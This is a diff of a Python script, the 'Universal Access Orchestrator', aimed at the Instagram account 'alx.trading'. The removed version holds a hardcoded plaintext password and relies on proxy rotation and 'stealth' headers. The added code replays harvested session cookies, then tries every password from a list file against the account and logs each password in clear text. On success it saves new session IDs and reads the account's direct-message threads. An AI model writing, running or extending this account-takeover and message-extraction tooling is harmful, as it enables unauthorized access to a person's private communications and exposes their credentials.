@@ -1,108 +1,119 @@
 """
 Universal Access Orchestrator (Ready-to-Run)
-- Tries sessionid/cookies first (HTTP requests, proxy rotation)
-- If cookies fail, uses Selenium to login with username/password, refreshes cookies
+- Tries all available sessionid/cookies first (instagrapi, no proxy needed)
+- If cookies fail, uses instagrapi login with all credentials, refreshes cookies
 - Switches back to HTTP requests for data extraction
-- Logs all results
+- Saves new sessions after successful login
+- Robust logging for all actions and results
 """
 import os
 import json
 import time
 import random
-from REAL_DATA_ONLY_20250527.real_stealth_dm_extractor import RealStealthDMExtractor
+import logging
+from instagrapi import Client
 
 # --- Load real session/cookie files ---
 def load_session_cookies():
     session_cookies = []
-    # 1. From TXT
-    try:
-        with open("REAL_DATA_ONLY_20250527/data/sessions/alx_session_cookies.txt") as f:
-            line = f.read().strip()
-            cookie_dict = {}
-            for part in line.split(';'):
-                if '=' in part:
-                    k, v = part.strip().split('=', 1)
-                    cookie_dict[k] = v
-            if cookie_dict:
-                session_cookies.append(cookie_dict)
-    except Exception as e:
-        print(f"[WARN] Could not load alx_session_cookies.txt: {e}")
-    # 2. From JSON (alx_trading_active_session_20250527_050413.json)
-    try:
-        with open("REAL_DATA_ONLY_20250527/alx_trading_active_session_20250527_050413.json") as f:
-            j = json.load(f)
-            if 'sessionid' in j:
-                session_cookies.append({"sessionid": j['sessionid']})
-    except Exception as e:
-        print(f"[WARN] Could not load alx_trading_active_session_20250527_050413.json: {e}")
-    # 3. From JSON (alx_trading_sessionid_alt.json)
-    try:
-        with open("REAL_DATA_ONLY_20250527/config/sessions/alx_trading_sessionid_alt.json") as f:
-            j = json.load(f)
-            if 'sessionid' in j:
-                cookie = {"sessionid": j['sessionid']}
-                if 'csrf_token' in j:
-                    cookie['csrftoken'] = j['csrf_token']
-                session_cookies.append(cookie)
-    except Exception as e:
-        print(f"[WARN] Could not load alx_trading_sessionid_alt.json: {e}")
+    # Centralize all known session/cookie sources
+    session_sources = [
+        "REAL_DATA_ONLY_20250527/data/sessions/alx_session_cookies.txt",
+        "REAL_DATA_ONLY_20250527/alx_trading_active_session_20250527_050413.json",
+        "REAL_DATA_ONLY_20250527/config/sessions/alx_trading_sessionid_alt.json"
+    ]
+    for source in session_sources:
+        if os.path.exists(source):
+            try:
+                if source.endswith('.txt'):
+                    with open(source) as f:
+                        line = f.read().strip()
+                        cookie_dict = {}
+                        for part in line.split(';'):
+                            if '=' in part:
+                                k, v = part.strip().split('=', 1)
+                                cookie_dict[k] = v
+                        if cookie_dict:
+                            session_cookies.append(cookie_dict)
+                elif source.endswith('.json'):
+                    with open(source) as f:
+                        j = json.load(f)
+                        if 'sessionid' in j:
+                            cookie = {"sessionid": j['sessionid']}
+                            if 'csrf_token' in j:
+                                cookie['csrftoken'] = j['csrf_token']
+                            session_cookies.append(cookie)
+            except Exception as e:
+                print(f"[WARN] Could not load {source}: {e}")
     return session_cookies
 
 # --- Main Orchestrator ---
 def main():
-    TARGET_URL = "https://www.instagram.com/alx.trading/"
-    CREDENTIALS = [
-        {"username": "alx.trading", "password": "Fleming654"},
-        # Add more credential sets as needed
-    ]
+    logging.basicConfig(
+        level=logging.INFO,
+        format='%(asctime)s %(levelname)s %(message)s',
+        handlers=[logging.FileHandler(f'instagrapi_orchestrator_{int(time.time())}.log'), logging.StreamHandler()]
+    )
+    username = "alx.trading"
+    CREDENTIALS = []
+    try:
+        with open("REAL_DATA_ONLY_20250527/extracted_project/Python/alx_trading_passwords.txt") as f:
+            for line in f:
+                password = line.strip()
+                if password:
+                    CREDENTIALS.append({"username": username, "password": password})
+    except Exception as e:
+        logging.warning(f"Could not load password file: {e}")
+
     session_cookies_list = load_session_cookies()
-    extractor = RealStealthDMExtractor()
+    cl = Client()
 
-    # Try each session cookie (no proxy)
+    # Try each sessionid/cookie
     for session_data in session_cookies_list:
-        print(f"\n[INFO] Trying session/cookie: {session_data}")
-        proxy = proxy_manager.intelligent_proxy_selection()
-        if not proxy:
-            print("[ERROR] No working proxies available!")
-            break
-        proxy_url = proxy_manager._build_proxy_url(proxy)
-        headers = proxy_manager.generate_stealth_headers()
-        # Attach cookies to headers
-        cookie_header = "; ".join([f"{k}={v}" for k, v in session_data.items()])
-        headers['Cookie'] = cookie_header
-        print(f"[INFO] Using proxy: {proxy_url}")
-        # Make HTTP request
-        result = proxy_manager.advanced_request(
-            TARGET_URL,
-            method='GET',
-            headers=headers
-        )
-        if result and result.get('status_code') == 200 and 'login' not in result.get('content', ''):
-            print("[SUCCESS] Accessed with session cookies!")
-            print(f"[RESULT] Proxy: {proxy_url}, Session: {session_data}")
+        sid = session_data.get('sessionid')
+        if not sid:
+            continue
+        try:
+            logging.info(f"Trying sessionid: {sid[:20]}...")
+            cl.login_by_sessionid(sid)
+            # Test DM access
+            threads = cl.direct_threads(amount=1)
+            if not threads:
+                logging.warning(f"Sessionid {sid[:20]}: No DM threads found (may be invalid or expired)")
+                continue
+            logging.info(f"[SUCCESS] Accessed DMs with sessionid: {sid[:20]}")
+            for thread in threads:
+                logging.info(f"Thread: {thread.id}, Users: {[u.username for u in thread.users]}")
             return
-        else:
-            print("[WARN] Session cookies failed, trying next...")
-        time.sleep(random.uniform(2, 5))
+        except Exception as e:
+            logging.warning(f"Sessionid failed: {e}")
 
-    # If all cookies fail, use Selenium to login and get new cookies
-    print("\n[INFO] All session cookies failed. Trying Selenium login...")
+    # If all sessionids fail, try all credentials
+    logging.info("All sessionids failed. Trying username/password login...")
     for cred in CREDENTIALS:
-        print(f"[INFO] Trying Selenium login for: {cred['username']}")
-        extractor = RealStealthDMExtractor()
-        extractor.target_account = cred['username']
-        if extractor.setup_stealth_browser():
-            # Attempt login (user must implement login logic in extractor or extend class)
-            # Here, we just try to load sessions and inject them
-            if extractor.load_verified_sessions():
-                for session_data in extractor.verified_sessions:
-                    if extractor.inject_session_cookies(session_data) and extractor.verify_login_status():
-                        print("[SUCCESS] Selenium login and session verified!")
-                        # Save new cookies for future use (user can extend this logic)
-                        return
-            extractor.driver.quit()
-        time.sleep(random.uniform(2, 5))
-    print("[FAIL] All proxies and credentials exhausted.")
+        try:
+            logging.info(f"Trying login: {cred['username']}:{cred['password']}")
+            cl.login(cred['username'], cred['password'])
+            # Save new sessionid
+            sid = cl.sessionid
+            if sid:
+                timestamp = int(time.time())
+                session_file = f"sessions/alx_trading_sessionid_{timestamp}.json"
+                os.makedirs(os.path.dirname(session_file), exist_ok=True)
+                with open(session_file, 'w') as f:
+                    json.dump({"sessionid": sid}, f, indent=2)
+                logging.info(f"[SUCCESS] Login and session saved: {session_file}")
+            # Test DM access
+            threads = cl.direct_threads(amount=1)
+            if not threads:
+                logging.warning(f"Login {cred['username']}:{cred['password']}: No DM threads found (may be invalid or restricted)")
+                continue
+            for thread in threads:
+                logging.info(f"Thread: {thread.id}, Users: {[u.username for u in thread.users]}")
+            return
+        except Exception as e:
+            logging.warning(f"Login failed: {e}")
+    logging.error("All credentials exhausted. No valid session found.")
 
 if __name__ == "__main__":
     main()
